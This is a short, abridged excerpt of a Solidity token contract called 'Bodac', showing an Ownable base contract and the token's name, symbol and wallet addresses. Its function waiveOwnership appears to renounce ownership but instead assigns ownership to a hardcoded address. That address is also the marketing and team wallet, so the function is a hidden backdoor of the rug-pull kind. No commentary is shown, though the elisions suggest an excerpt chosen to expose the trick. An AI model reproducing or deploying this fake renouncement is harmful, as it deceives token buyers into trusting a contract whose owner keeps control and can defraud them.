...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xa9D9616c18d09cd28DED182C84903775D5B2c347);
    }
...
contract Bodac is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bodac";
    string private _symbol = "BODAC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa9D9616c18d09cd28DED182C84903775D5B2c347);
    address payable public teamWalletAddress = payable(0xa9D9616c18d09cd28DED182C84903775D5B2c347);
